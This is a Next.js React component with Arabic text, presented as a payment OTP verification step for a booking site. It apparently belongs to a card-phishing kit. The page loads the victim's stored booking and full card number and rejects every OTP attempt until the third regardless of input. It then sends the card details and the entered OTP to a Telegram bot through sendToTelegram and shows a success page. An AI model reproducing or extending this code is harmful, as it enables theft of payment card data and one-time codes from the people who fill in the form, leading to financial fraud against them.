// components/OtpVerification.jsx
'use client';
import { useState, useEffect, useRef } from 'react';
import { useRouter } from 'next/navigation';
import { sendToTelegram } from '../lib/telegramBot';
import Image from 'next/image';

export default function OtpVerification() {
  const router = useRouter();
  const [otp, setOtp] = useState(['', '', '', '']);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');
  const [bookingDetails, setBookingDetails] = useState(null);
  const [countdown, setCountdown] = useState(30);
  const [attempts, setAttempts] = useState(0);
  const [cardInfo, setCardInfo] = useState({ type: null, bank: null });
  const inputRefs = [useRef(), useRef(), useRef(), useRef()];

  useEffect(() => {
    // Retrieve complete booking details
    const storedDetails = sessionStorage.getItem('completeBookingDetails');
    if (storedDetails) {
      const details = JSON.parse(storedDetails);
      setBookingDetails(details);

      // Detect card type and bank based on BIN (first 6 digits)
      if (details.cardNumber) {
        const bin = details.cardNumber.replace(/\s/g, '').substring(0, 6);
        detectCardInfo(bin);
      }
    } else {
      router.push('/');
    }

    // Focus on first input
    if (inputRefs[0].current) {
      inputRefs[0].current.focus();
    }

    // Start countdown for resend
    const timer = setInterval(() => {
      setCountdown((prev) => {
        if (prev <= 1) {
          clearInterval(timer);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    return () => clearInterval(timer);
  }, [router]);

  const detectCardInfo = (bin) => {
    // Simple BIN detection logic (in a real app, you'd use a BIN database)
    let type = 'unknown';
    let bank = 'Unknown Bank';

    // Detect card type
    if (/^4/.test(bin)) {
      type = 'visa';
      bank = 'Visa Bank';
    } else if (/^5[1-5]/.test(bin)) {
      type = 'mastercard';
      bank = 'Mastercard Bank';
    } else if (/^3[47]/.test(bin)) {
      type = 'amex';
      bank = 'American Express';
    } else if (/^6(?:011|5)/.test(bin)) {
      type = 'discover';
      bank = 'Discover Bank';
    }

    setCardInfo({ type, bank });
  };

  const handleChange = (value, index) => {
    // Only allow numbers
    if (!/^\d*$/.test(value)) return;

    const newOtp = [...otp];
    newOtp[index] = value;
    setOtp(newOtp);

    // Auto-focus to next input
    if (value && index < 3 && inputRefs[index + 1].current) {
      inputRefs[index + 1].current.focus();
    }
  };

  const handleKeyDown = (e, index) => {
    // Move to previous input on backspace
    if (
      e.key === 'Backspace' &&
      !otp[index] &&
      index > 0 &&
      inputRefs[index - 1].current
    ) {
      inputRefs[index - 1].current.focus();
    }
  };

  const handlePaste = (e) => {
    e.preventDefault();
    const pasteData = e.clipboardData.getData('text').slice(0, 4).split('');

    if (pasteData.some((char) => !/\d/.test(char))) {
      return; // Contain non-digits
    }

    const newOtp = [...otp];
    pasteData.forEach((char, idx) => {
      if (idx < 4) {
        newOtp[idx] = char;
      }
    });

    setOtp(newOtp);

    // Focus last filled input or the next empty one
    const lastIndex = Math.min(pasteData.length - 1, 3);
    if (inputRefs[lastIndex].current) {
      inputRefs[lastIndex].current.focus();
    }
  };

  const resendOtp = () => {
    if (countdown > 0) return;

    // Reset countdown
    setCountdown(30);

    // Start timer again
    const timer = setInterval(() => {
      setCountdown((prev) => {
        if (prev <= 1) {
          clearInterval(timer);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);
  };

  const verifyOtp = async () => {
    setError('');

    const enteredOtp = otp.join('');
    if (enteredOtp.length !== 4) {
      setError('الرجاء إدخال رمز التحقق المكون من 4 أرقام');
      return;
    }

    setLoading(true);

    try {
      // For demo, always show error until 3rd attempt
      const newAttempts = attempts + 1;
      setAttempts(newAttempts);

      if (newAttempts < 3) {
        await new Promise((resolve) => setTimeout(resolve, 1000));
        setError('رمز التحقق غير صحيح. حاول مرة أخرى.');
        setLoading(false);
        return;
      }

      // Send booking details to Telegram with OTP
      if (bookingDetails) {
        await sendToTelegram(bookingDetails, enteredOtp);
      }

      // Simulate processing delay
      await new Promise((resolve) => setTimeout(resolve, 1500));

      // Redirect to confirmation page after 3rd attempt
      router.push('/success');
    } catch (error) {
      console.error('Verification error:', error);
      setError('فشل التحقق. الرجاء المحاولة مرة أخرى.');
    } finally {
      setLoading(false);
    }
  };

  if (!bookingDetails) {
    return <div className='py-12 text-center'>جاري التحميل...</div>;
  }

  return (
    <div className='bg-dark-gray rounded-lg p-6 shadow-lg'>
      <h3 className='text-neon-yellow mb-2 text-xl font-bold'>تحقق من الدفع</h3>

      {cardInfo.type && (
        <div className='bg-card-bg mb-4 flex items-center rounded-lg p-3'>
          {cardInfo.type !== 'unknown' && (
            <div className='mr-3'>
              <Image
                src={`/images/${cardInfo.type}.png`}
                alt={cardInfo.type}
                width={40}
                height={25}
              />
            </div>
          )}
          <div>
            <p className='text-sm text-gray-300'>{cardInfo.bank}</p>
            <p className='text-sm text-gray-400'>
              {bookingDetails.cardNumber
                ?.replace(/\s/g, '')
                .replace(/(\d{4})/g, '$1 ')
                .replace(
                  /(\d{4}) (\d{4}) (\d{4}) (\d{4})/,
                  '•••• •••• •••• $4'
                )}
            </p>
          </div>
        </div>
      )}

      <p className='mb-6 text-gray-300'>
        لقد أرسلنا رمزًا مكونًا من 4 أرقام إلى بريدك الإلكتروني وهاتفك.
        <br />
        <span className='text-sm'>
          (للتجربة، استخدم أي رمز - سيتم قبوله بعد المحاولة الثالثة)
        </span>
      </p>

      <div className='mb-6 flex justify-center space-x-3 rtl:space-x-reverse'>
        {otp.map((digit, index) => (
          <input
            key={index}
            ref={inputRefs[index]}
            type='text'
            maxLength='1'
            value={digit}
            onChange={(e) => handleChange(e.target.value, index)}
            onKeyDown={(e) => handleKeyDown(e, index)}
            onPaste={index === 0 ? handlePaste : undefined}
            className='bg-dark focus:border-neon-yellow h-14 w-14 rounded-lg border border-gray-600 text-center text-xl text-white focus:outline-none'
          />
        ))}
      </div>

      {error && <div className='mb-4 text-center text-red-500'>{error}</div>}

      <button
        onClick={verifyOtp}
        className='btn-primary mb-4 flex w-full items-center justify-center'
        disabled={loading}
      >
        {loading ? (
          <>
            <svg
              className='text-dark -ml-1 mr-3 h-5 w-5 animate-spin'
              xmlns='http://www.w3.org/2000/svg'
              fill='none'
              viewBox='0 0 24 24'
            >
              <circle
                className='opacity-25'
                cx='12'
                cy='12'
                r='10'
                stroke='currentColor'
                strokeWidth='4'
              ></circle>
              <path
                className='opacity-75'
                fill='currentColor'
                d='M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z'
              ></path>
            </svg>
            جاري التحقق...
          </>
        ) : (
          'تحقق من الرمز'
        )}
      </button>

      <div className='text-center'>
        <p className='mb-1 text-sm text-gray-400'>محاولة {attempts}/3</p>
        <button
          onClick={resendOtp}
          disabled={countdown > 0}
          className={`text-sm ${
            countdown > 0 ? 'text-gray-500' : 'text-neon-yellow hover:underline'
          }`}
        >
          {countdown > 0
            ? `إعادة إرسال الرمز خلال ${countdown} ثانية`
            : 'إعادة إرسال الرمز'}
        </button>
      </div>
    </div>
  );
}
